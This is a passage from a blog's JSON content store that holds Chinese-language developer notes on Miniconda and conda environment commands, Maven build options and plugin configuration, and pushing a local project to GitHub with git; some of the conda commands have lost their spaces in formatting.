class=\"line\">C:\\Program Files\\Intel\\iCLS Client\\;%SystemRoot%\\system32;%SystemRoot%;%SystemRoot%\\System32\\Wbem;%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\;</span><br><span class=\"line\">C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;</span><br><span class=\"line\">C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;</span><br><span class=\"line\">C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;</span><br><span class=\"line\">C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;%MAVEN_HOME%\\bin;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;%CATALINA_HOME%\\lib;%CATALINA_HOME%\\bin;</span><br><span class=\"line\">C:\\Program Files\\TortoiseSVN\\bin;</span><br></pre></td></tr></table></figure>\n<p>These Miniconda installers contain the conda package manager and Python. Once Miniconda is installed, you can use the conda command to install any other packages and create environments, etc. For example:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda install numpy</span><br><span class=\"line\"></span><br><span class=\"line\">$ conda create -n py3k anaconda python=3</span><br></pre></td></tr></table></figure>\n<p>There are two variants of the installer: Miniconda is Python 2 based and Miniconda3 is Python 3 based. Note that the choice of which Miniconda is installed only affects the root environment. Regardless of which version of Miniconda you install, you can still install both Python 2.x and Python 3.x environments.</p>\n<p>The other difference is that the Python 3 version of Miniconda will default to Python 3 when creating new environments and building packages. So for instance, the behavior of</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda create -n myenv python</span><br></pre></td></tr></table></figure>\n<p>will be to install Python 2.7 with the Python 2 Miniconda and to install Python 3.6 with the Python 3 Miniconda. You can override the default by explicitly setting python=2 or python=3. It also determines the default value of CONDA_PY when using conda build.</p>\n<p>We have 32-bit Mac OS X binaries available, please contact us for more details at <a href=\"mailto:sales@continuum.io\" target=\"_blank\" rel=\"noopener\">sales@continuum.io</a>.</p>\n<p>Note: If you already have Miniconda or Anaconda installed, and you just want to upgrade, you should not use the installer. Just use conda update. For instance<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ conda update conda</span><br></pre></td></tr></table></figure></p>\n"},{"title":"墨菲定律、二八法则、马太效应、手表定理、零和游戏、酒与污水定律、水桶定律、蘑菇管理原理","date":"2018-07-10T13:09:19.000Z","_content":"[墨菲定律、二八法则、马太效应、手表定理、“不值得”定律、彼得原理、零和游戏、华盛顿合作规律、酒与污水定律、水桶定律、蘑菇管理原理、钱的问题、奥卡姆剃刀等13条是](http://blog.csdn.net/happyqwz/article/details/9096955)\n","source":"_posts/其他/墨菲定律、二八法则、马太效应、手表定理、零和游戏、酒与污水定律、水桶定律、蘑菇管理原理.md","raw":"---\ntitle: 墨菲定律、二八法则、马太效应、手表定理、零和游戏、酒与污水定律、水桶定律、蘑菇管理原理\ndate: 2018-07-10 21:09:19\ntags: 其他\n---\n[墨菲定律、二八法则、马太效应、手表定理、“不值得”定律、彼得原理、零和游戏、华盛顿合作规律、酒与污水定律、水桶定律、蘑菇管理原理、钱的问题、奥卡姆剃刀等13条是](http://blog.csdn.net/happyqwz/article/details/9096955)\n","slug":"其他/墨菲定律、二八法则、马太效应、手表定理、零和游戏、酒与污水定律、水桶定律、蘑菇管理原理","published":1,"updated":"2018-07-10T13:10:09.996Z","_id":"cjjedmhcf008g0gtjmnywhvdu","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/happyqwz/article/details/9096955\" target=\"_blank\" rel=\"noopener\">墨菲定律、二八法则、马太效应、手表定理、“不值得”定律、彼得原理、零和游戏、华盛顿合作规律、酒与污水定律、水桶定律、蘑菇管理原理、钱的问题、奥卡姆剃刀等13条是</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/happyqwz/article/details/9096955\" target=\"_blank\" rel=\"noopener\">墨菲定律、二八法则、马太效应、手表定理、“不值得”定律、彼得原理、零和游戏、华盛顿合作规律、酒与污水定律、水桶定律、蘑菇管理原理、钱的问题、奥卡姆剃刀等13条是</a></p>\n"},{"title":"conda操作","date":"2018-07-10T13:09:19.000Z","_content":"#### 管理python\r\n创建一个名为python34的环境，指定Python版本是3.4（不用管是3.4.x，conda会为我们自动寻找3.4.x中的最新版本）  \r\n\r\n    condacreate--namepython34python=3.4  \r\n  \r\n安装好后，使用activate激活某个环境 \r\n\r\n    activatepython34# for Windows  \r\n    sourceactivatepython34# for Linux & Mac  \r\n激活后，会发现terminal输入的地方多了python34的字样，实际上，此时系统做的事情就是把默认2.7环境从PATH中去除，再把3.4对应的命令加入PATH  \r\n  \r\n此时，再次输入  \r\n\r\n    python--version  \r\n可以得到`Python 3.4.5 :: Anaconda 4.1.1 (64-bit)`，即系统已经切换到了3.4的环境  \r\n  \r\n如果想返回默认的python 2.7环境，运行  \r\n\r\n    deactivatepython34# for Windows  \r\n    sourcedeactivatepython34# for Linux & Mac  \r\n  \r\n复制一个环境  \r\n\r\n    conda create -n pyhon34 --clone python34clone  \r\n删除一个已有的环境  \r\n\r\n    condaremove--namepython34--all  \r\n 为了确定这个环境已经被移除，输入以下命令  \r\n\r\n    conda info -e  \r\n\r\n#### 管理包\r\n查看当前环境下已安装的包  \r\n\r\n    condalist  \r\n  \r\n查看某个指定环境的已安装包  \r\n\r\n    condalist-npython34  \r\n  \r\n查找package信息  \r\n\r\n    condasearchnumpy  \r\n  \r\n安装package  \r\n\r\n    condainstall-npython34numpy  \r\n如果不用-n指定环境名称，则被安装在当前活跃环境   也可以通过-c指定通过某个channel安装  \r\n  \r\n更新package  \r\n\r\n    condaupdate-npython34numpy  \r\n  \r\n删除package  \r\n    \r\n    condaremove-npython34numpy  ","source":"_posts/开发工具/conda操作.md","raw":"---\ntitle: conda操作\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\n#### 管理python\r\n创建一个名为python34的环境，指定Python版本是3.4（不用管是3.4.x，conda会为我们自动寻找3.4.x中的最新版本）  \r\n\r\n    condacreate--namepython34python=3.4  \r\n  \r\n安装好后，使用activate激活某个环境 \r\n\r\n    activatepython34# for Windows  \r\n    sourceactivatepython34# for Linux & Mac  \r\n激活后，会发现terminal输入的地方多了python34的字样，实际上，此时系统做的事情就是把默认2.7环境从PATH中去除，再把3.4对应的命令加入PATH  \r\n  \r\n此时，再次输入  \r\n\r\n    python--version  \r\n可以得到`Python 3.4.5 :: Anaconda 4.1.1 (64-bit)`，即系统已经切换到了3.4的环境  \r\n  \r\n如果想返回默认的python 2.7环境，运行  \r\n\r\n    deactivatepython34# for Windows  \r\n    sourcedeactivatepython34# for Linux & Mac  \r\n  \r\n复制一个环境  \r\n\r\n    conda create -n pyhon34 --clone python34clone  \r\n删除一个已有的环境  \r\n\r\n    condaremove--namepython34--all  \r\n 为了确定这个环境已经被移除，输入以下命令  \r\n\r\n    conda info -e  \r\n\r\n#### 管理包\r\n查看当前环境下已安装的包  \r\n\r\n    condalist  \r\n  \r\n查看某个指定环境的已安装包  \r\n\r\n    condalist-npython34  \r\n  \r\n查找package信息  \r\n\r\n    condasearchnumpy  \r\n  \r\n安装package  \r\n\r\n    condainstall-npython34numpy  \r\n如果不用-n指定环境名称，则被安装在当前活跃环境   也可以通过-c指定通过某个channel安装  \r\n  \r\n更新package  \r\n\r\n    condaupdate-npython34numpy  \r\n  \r\n删除package  \r\n    \r\n    condaremove-npython34numpy  ","slug":"开发工具/conda操作","published":1,"updated":"2018-07-10T13:10:09.998Z","_id":"cjjedmhch008h0gtjx23jyv0c","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"管理python\"><a href=\"#管理python\" class=\"headerlink\" title=\"管理python\"></a>管理python</h4><p>创建一个名为python34的环境，指定Python版本是3.4（不用管是3.4.x，conda会为我们自动寻找3.4.x中的最新版本）  </p>\n<pre><code>condacreate--namepython34python=3.4  \n</code></pre><p>安装好后，使用activate激活某个环境 </p>\n<pre><code>activatepython34# for Windows  \nsourceactivatepython34# for Linux &amp; Mac  \n</code></pre><p>激活后，会发现terminal输入的地方多了python34的字样，实际上，此时系统做的事情就是把默认2.7环境从PATH中去除，再把3.4对应的命令加入PATH  </p>\n<p>此时，再次输入  </p>\n<pre><code>python--version  \n</code></pre><p>可以得到<code>Python 3.4.5 :: Anaconda 4.1.1 (64-bit)</code>，即系统已经切换到了3.4的环境  </p>\n<p>如果想返回默认的python 2.7环境，运行  </p>\n<pre><code>deactivatepython34# for Windows  \nsourcedeactivatepython34# for Linux &amp; Mac  \n</code></pre><p>复制一个环境  </p>\n<pre><code>conda create -n pyhon34 --clone python34clone  \n</code></pre><p>删除一个已有的环境  </p>\n<pre><code>condaremove--namepython34--all  \n</code></pre><p> 为了确定这个环境已经被移除，输入以下命令  </p>\n<pre><code>conda info -e  \n</code></pre><h4 id=\"管理包\"><a href=\"#管理包\" class=\"headerlink\" title=\"管理包\"></a>管理包</h4><p>查看当前环境下已安装的包  </p>\n<pre><code>condalist  \n</code></pre><p>查看某个指定环境的已安装包  </p>\n<pre><code>condalist-npython34  \n</code></pre><p>查找package信息  </p>\n<pre><code>condasearchnumpy  \n</code></pre><p>安装package  </p>\n<pre><code>condainstall-npython34numpy  \n</code></pre><p>如果不用-n指定环境名称，则被安装在当前活跃环境   也可以通过-c指定通过某个channel安装  </p>\n<p>更新package  </p>\n<pre><code>condaupdate-npython34numpy  \n</code></pre><p>删除package  </p>\n<pre><code>condaremove-npython34numpy  \n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"管理python\"><a href=\"#管理python\" class=\"headerlink\" title=\"管理python\"></a>管理python</h4><p>创建一个名为python34的环境，指定Python版本是3.4（不用管是3.4.x，conda会为我们自动寻找3.4.x中的最新版本）  </p>\n<pre><code>condacreate--namepython34python=3.4  \n</code></pre><p>安装好后，使用activate激活某个环境 </p>\n<pre><code>activatepython34# for Windows  \nsourceactivatepython34# for Linux &amp; Mac  \n</code></pre><p>激活后，会发现terminal输入的地方多了python34的字样，实际上，此时系统做的事情就是把默认2.7环境从PATH中去除，再把3.4对应的命令加入PATH  </p>\n<p>此时，再次输入  </p>\n<pre><code>python--version  \n</code></pre><p>可以得到<code>Python 3.4.5 :: Anaconda 4.1.1 (64-bit)</code>，即系统已经切换到了3.4的环境  </p>\n<p>如果想返回默认的python 2.7环境，运行  </p>\n<pre><code>deactivatepython34# for Windows  \nsourcedeactivatepython34# for Linux &amp; Mac  \n</code></pre><p>复制一个环境  </p>\n<pre><code>conda create -n pyhon34 --clone python34clone  \n</code></pre><p>删除一个已有的环境  </p>\n<pre><code>condaremove--namepython34--all  \n</code></pre><p> 为了确定这个环境已经被移除，输入以下命令  </p>\n<pre><code>conda info -e  \n</code></pre><h4 id=\"管理包\"><a href=\"#管理包\" class=\"headerlink\" title=\"管理包\"></a>管理包</h4><p>查看当前环境下已安装的包  </p>\n<pre><code>condalist  \n</code></pre><p>查看某个指定环境的已安装包  </p>\n<pre><code>condalist-npython34  \n</code></pre><p>查找package信息  </p>\n<pre><code>condasearchnumpy  \n</code></pre><p>安装package  </p>\n<pre><code>condainstall-npython34numpy  \n</code></pre><p>如果不用-n指定环境名称，则被安装在当前活跃环境   也可以通过-c指定通过某个channel安装  </p>\n<p>更新package  </p>\n<pre><code>condaupdate-npython34numpy  \n</code></pre><p>删除package  </p>\n<pre><code>condaremove-npython34numpy  \n</code></pre>"},{"title":"mavean","date":"2018-07-10T13:09:19.000Z","_content":"- #### 打包跳过测试\n\n        mvn install -DskipTests","source":"_posts/开发工具/mavean.md","raw":"---\ntitle: mavean\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\n- #### 打包跳过测试\n\n        mvn install -DskipTests","slug":"开发工具/mavean","published":1,"updated":"2018-07-10T13:10:10.001Z","_id":"cjjedmhci008i0gtjgd4ikszr","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"打包跳过测试\"><a href=\"#打包跳过测试\" class=\"headerlink\" title=\"打包跳过测试\"></a>打包跳过测试</h4><pre><code>mvn install -DskipTests\n</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"打包跳过测试\"><a href=\"#打包跳过测试\" class=\"headerlink\" title=\"打包跳过测试\"></a>打包跳过测试</h4><pre><code>mvn install -DskipTests\n</code></pre></li>\n</ul>\n"},{"title":"git把本地项目push到远程仓库","date":"2018-07-10T13:09:19.000Z","_content":"\n#### 环境\n\n系统：windows\n\n目录：D:/workspace/idea/spark-test\n\n远程仓库：https://github.com/HanlaoTwo/SparkStudy.git\n\n协议：https\n\n#### 创建版本库\n\n```\n#初始化\ngit init\n\nReinitialized existing Git repository in D:/workspace/idea/spark-test/.git/\n\n#用命令git add告诉Git，把文件添加到仓库：\ngit add *\nwarning: LF will be replaced by CRLF in src/main/scala/sql/SparkSQLExample.scala.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/compiler.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/encodings.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/misc.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/modules.xml.\n...\n\n#提交\ngit commit -m \"all is new\"\n[master (root-commit) 521cf14] all is new\nwarning: LF will be replaced by CRLF in .idea/compiler.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/encodings.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/misc.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/modules.xml.\n```\n#### 提交到远程仓库\n```\n#添加\ngit remote add origin https://github.com/HanlaoTwo/SparkStudy.git\n#报错，已存在\nfatal: remote origin already exists.\n\n#删除\ngit remote rm origin\n#再添加\ngit remote add origin https://github.com/HanlaoTwo/SparkStudy.git\n\n#提交\ngit push -u origin master\nUsername for 'https://github.com': hanlaotwo\nPassword for 'https://hanlaotwo@github.com':\nCounting objects: 294, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (279/279), done.\nWriting objects:  99% (292/294), 1.10 MiB | 68.00 KiB/s\n\n```","source":"_posts/开发工具/git把本地项目push到远程仓库.md","raw":"---\ntitle: git把本地项目push到远程仓库\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\n\n#### 环境\n\n系统：windows\n\n目录：D:/workspace/idea/spark-test\n\n远程仓库：https://github.com/HanlaoTwo/SparkStudy.git\n\n协议：https\n\n#### 创建版本库\n\n```\n#初始化\ngit init\n\nReinitialized existing Git repository in D:/workspace/idea/spark-test/.git/\n\n#用命令git add告诉Git，把文件添加到仓库：\ngit add *\nwarning: LF will be replaced by CRLF in src/main/scala/sql/SparkSQLExample.scala.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/compiler.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/encodings.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/misc.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/modules.xml.\n...\n\n#提交\ngit commit -m \"all is new\"\n[master (root-commit) 521cf14] all is new\nwarning: LF will be replaced by CRLF in .idea/compiler.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/encodings.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/misc.xml.\nThe file will have its original line endings in your working directory.\nwarning: LF will be replaced by CRLF in .idea/modules.xml.\n```\n#### 提交到远程仓库\n```\n#添加\ngit remote add origin https://github.com/HanlaoTwo/SparkStudy.git\n#报错，已存在\nfatal: remote origin already exists.\n\n#删除\ngit remote rm origin\n#再添加\ngit remote add origin https://github.com/HanlaoTwo/SparkStudy.git\n\n#提交\ngit push -u origin master\nUsername for 'https://github.com': hanlaotwo\nPassword for 'https://hanlaotwo@github.com':\nCounting objects: 294, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (279/279), done.\nWriting objects:  99% (292/294), 1.10 MiB | 68.00 KiB/s\n\n```","slug":"开发工具/git把本地项目push到远程仓库","published":1,"updated":"2018-07-10T13:10:09.999Z","_id":"cjjedmhcj008l0gtj2m8mptir","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><p>系统：windows</p>\n<p>目录：D:/workspace/idea/spark-test</p>\n<p>远程仓库：<a href=\"https://github.com/HanlaoTwo/SparkStudy.git\" target=\"_blank\" rel=\"noopener\">https://github.com/HanlaoTwo/SparkStudy.git</a></p>\n<p>协议：https</p>\n<h4 id=\"创建版本库\"><a href=\"#创建版本库\" class=\"headerlink\" title=\"创建版本库\"></a>创建版本库</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#初始化</span><br><span class=\"line\">git init</span><br><span class=\"line\"></span><br><span class=\"line\">Reinitialized existing Git repository in D:/workspace/idea/spark-test/.git/</span><br><span class=\"line\"></span><br><span class=\"line\">#用命令git add告诉Git，把文件添加到仓库：</span><br><span class=\"line\">git add *</span><br><span class=\"line\">warning: LF will be replaced by CRLF in src/main/scala/sql/SparkSQLExample.scala.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/compiler.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/encodings.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/misc.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/modules.xml.</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">#提交</span><br><span class=\"line\">git commit -m &quot;all is new&quot;</span><br><span class=\"line\">[master (root-commit) 521cf14] all is new</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/compiler.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/encodings.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/misc.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/modules.xml.</span><br></pre></td></tr></table></figure>\n<h4 id=\"提交到远程仓库\"><a href=\"#提交到远程仓库\" class=\"headerlink\" title=\"提交到远程仓库\"></a>提交到远程仓库</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#添加</span><br><span class=\"line\">git remote add origin https://github.com/HanlaoTwo/SparkStudy.git</span><br><span class=\"line\">#报错，已存在</span><br><span class=\"line\">fatal: remote origin already exists.</span><br><span class=\"line\"></span><br><span class=\"line\">#删除</span><br><span class=\"line\">git remote rm origin</span><br><span class=\"line\">#再添加</span><br><span class=\"line\">git remote add origin https://github.com/HanlaoTwo/SparkStudy.git</span><br><span class=\"line\"></span><br><span class=\"line\">#提交</span><br><span class=\"line\">git push -u origin master</span><br><span class=\"line\">Username for &apos;https://github.com&apos;: hanlaotwo</span><br><span class=\"line\">Password for &apos;https://hanlaotwo@github.com&apos;:</span><br><span class=\"line\">Counting objects: 294, done.</span><br><span class=\"line\">Delta compression using up to 4 threads.</span><br><span class=\"line\">Compressing objects: 100% (279/279), done.</span><br><span class=\"line\">Writing objects:  99% (292/294), 1.10 MiB | 68.00 KiB/s</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><p>系统：windows</p>\n<p>目录：D:/workspace/idea/spark-test</p>\n<p>远程仓库：<a href=\"https://github.com/HanlaoTwo/SparkStudy.git\" target=\"_blank\" rel=\"noopener\">https://github.com/HanlaoTwo/SparkStudy.git</a></p>\n<p>协议：https</p>\n<h4 id=\"创建版本库\"><a href=\"#创建版本库\" class=\"headerlink\" title=\"创建版本库\"></a>创建版本库</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#初始化</span><br><span class=\"line\">git init</span><br><span class=\"line\"></span><br><span class=\"line\">Reinitialized existing Git repository in D:/workspace/idea/spark-test/.git/</span><br><span class=\"line\"></span><br><span class=\"line\">#用命令git add告诉Git，把文件添加到仓库：</span><br><span class=\"line\">git add *</span><br><span class=\"line\">warning: LF will be replaced by CRLF in src/main/scala/sql/SparkSQLExample.scala.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/compiler.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/encodings.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/misc.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/modules.xml.</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">#提交</span><br><span class=\"line\">git commit -m &quot;all is new&quot;</span><br><span class=\"line\">[master (root-commit) 521cf14] all is new</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/compiler.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/encodings.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/misc.xml.</span><br><span class=\"line\">The file will have its original line endings in your working directory.</span><br><span class=\"line\">warning: LF will be replaced by CRLF in .idea/modules.xml.</span><br></pre></td></tr></table></figure>\n<h4 id=\"提交到远程仓库\"><a href=\"#提交到远程仓库\" class=\"headerlink\" title=\"提交到远程仓库\"></a>提交到远程仓库</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#添加</span><br><span class=\"line\">git remote add origin https://github.com/HanlaoTwo/SparkStudy.git</span><br><span class=\"line\">#报错，已存在</span><br><span class=\"line\">fatal: remote origin already exists.</span><br><span class=\"line\"></span><br><span class=\"line\">#删除</span><br><span class=\"line\">git remote rm origin</span><br><span class=\"line\">#再添加</span><br><span class=\"line\">git remote add origin https://github.com/HanlaoTwo/SparkStudy.git</span><br><span class=\"line\"></span><br><span class=\"line\">#提交</span><br><span class=\"line\">git push -u origin master</span><br><span class=\"line\">Username for &apos;https://github.com&apos;: hanlaotwo</span><br><span class=\"line\">Password for &apos;https://hanlaotwo@github.com&apos;:</span><br><span class=\"line\">Counting objects: 294, done.</span><br><span class=\"line\">Delta compression using up to 4 threads.</span><br><span class=\"line\">Compressing objects: 100% (279/279), done.</span><br><span class=\"line\">Writing objects:  99% (292/294), 1.10 MiB | 68.00 KiB/s</span><br></pre></td></tr></table></figure>"},{"title":"maven插件","date":"2018-07-10T13:09:19.000Z","_content":"- maven-surefire-plugin\n\nMaven通过Maven Surefire Plugin插件执行单元测试。（通过Maven Failsafe Plugin插件执行集成测试）\n\n \n\n在pom.xml中配置JUnit,TestNG测试框架的依赖，即可自动识别和运行src/test目录下利用该框架编写的测试用例。surefire也能识别和执行符合一定命名约定的普通类中的测试方法（POJO测试）。\n\n生命周期中test阶段默认绑定的插件目标就是surefire中的test目标，无需额外配置，直接运行mvn test就可以。\n\n \n\n基本配置如下，下文中的配置项如无特殊说明，都位于pom文件的<configuration>节点中。\n```\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-surefire-plugin</artifactId>\n        <version>2.18.1</version>\n        <configuration>\n          ......\n　　　　　　配置内容\n　　　　　　......\n        </configuration>\n      </plugin>\n```\n```\n \n\n//常用通用配置\n// 跳过测试阶段\n<skipTests>true</skipTests>\n或者 \n\nmvn install -DskipTests\n或者 （Compliler插件也会根据该参数跳过编译测试类） \n\nmvn install -Dmaven.test.skip=true\n \n```\n忽略测试失败 \nMaven在测试阶段出现失败的用例时，默认的行为是停止当前构建，构建过程也会以失败结束。有时候（如测试驱动开发模式）即使测试出现失败用例，仍然希望能继续构建项目。\n```\n<testFailureIgnore>true</testFailureIgnore> \n或者\n\nmvn test -Dmaven.test.failure.ignore=true\n \n```\n- maven-jar-plugin\n\n默认的mvn install生成的jar是不带主类入口的，需要在maven-compile-plugin中设置主类\n```\n<plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-jar-plugin</artifactId>\n                <configuration>\n                    <archive>\n                        <manifest>\n                            <addClasspath>true</addClasspath>\n                            <classpathPrefix>lib/</classpathPrefix>\n                        </manifest>\n                    </archive>\n                </configuration>\n            </plugin>\n```\n- maven-compiler-plugin\n\n设置编译器的版本\n\n```\n<plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <version>3.1</version>\n                <configuration>\n                    <source>1.7</source>\n                    <target>1.7</target>\n                </configuration>\n            </plugin>\n```\n- maven-dependency-plugin\n把依赖的jar包单独放到一个目录下\n```\n<plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-dependency-plugin</artifactId>\n                <executions>\n                    <execution>\n                        <id>copy-dependencies</id>\n                        <phase>prepare-package</phase>\n                        <goals>\n                            <goal>copy-dependencies</goal>\n                        </goals>\n                        <configuration>\n                            <outputDirectory>${project.build.directory}/lib</outputDirectory>\n                            <overWriteReleases>false</overWriteReleases>\n                            <overWriteSnapshots>false</overWriteSnapshots>\n                            <overWriteIfNewer>true</overWriteIfNewer>\n                        </configuration>\n                    </execution>\n                </executions>\n            </plugin>\n```","source":"_posts/开发工具/maven插件.md","raw":"---\ntitle: maven插件\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\n- maven-surefire-plugin\n\nMaven通过Maven Surefire Plugin插件执行单元测试。（通过Maven Failsafe Plugin插件执行集成测试）\n\n \n\n在pom.xml中配置JUnit,TestNG测试框架的依赖，即可自动识别和运行src/test目录下利用该框架编写的测试用例。surefire也能识别和执行符合一定命名约定的普通类中的测试方法（POJO测试）。\n\n生命周期中test阶段默认绑定的插件目标就是surefire中的test目标，无需额外配置，直接运行mvn test就可以。\n\n \n\n基本配置如下，下文中的配置项如无特殊说明，都位于pom文件的<configuration>节点中。\n```\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-surefire-plugin</artifactId>\n        